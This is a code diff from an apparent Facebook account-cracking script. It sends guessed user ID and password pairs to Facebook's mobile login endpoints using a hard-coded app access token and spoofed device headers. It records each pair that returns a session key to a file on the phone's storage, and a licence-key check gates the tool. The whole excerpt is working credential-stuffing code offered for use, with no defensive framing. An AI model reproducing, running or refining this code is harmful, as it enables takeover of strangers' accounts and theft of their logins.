-                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
+                headers = {
+                    'Host': 'hdr.fb.com',
+                    'User-Agent': 'Facebook',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'X-FB-HTTP-Engine': 'Tigon/Liger',
+                    'x-fb-client-ip': 'True',
+                    'x-fb-server-cluster': 'True',
+                    'X-ZERO-F-DEVICE-ID': 'e3ee80f4-5c83-4468-a22f-b68b47900055',
+                    'x-zero-eh': '664c0faaac849cb891d0a261fbb72a12',
+                    'app-scope-id-header': 'dc767d06-3846-48ce-848c-6bb47662f3f7',
+                    'x-fb-conn-uuid-client': 'sbQ1GdhKzcTild6k56CNYA==',
+                    'Connection': 'keep-alive'
+                }
+                url = f"https://b-graph.facebook.com/auth/login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
-                    print(f"\r\r(\x1b[1;37mARMAN\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
+                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mARMAN\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                     open('/sdcard/ARMAN-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
-                elif 'session_key' in po:
-                    print(f"\r\r(\x1b[1;37mARMAN\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/ARMAN-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                    oks.append(uid)
-                    break
-        except Exception:
+        except Exception as e:
             pass
     loop += 1
 
 if __name__ == '__main__':
-    result = check_key()
-    if result:
-        user_name, user_key, expiry_str = result
-        remaining_time = calculate_time_left(expiry_str)
-        display_welcome_banner(user_name, user_key, remaining_time)
-        hold_screen_10_seconds()
+    if check_key():
         BNG_71_()
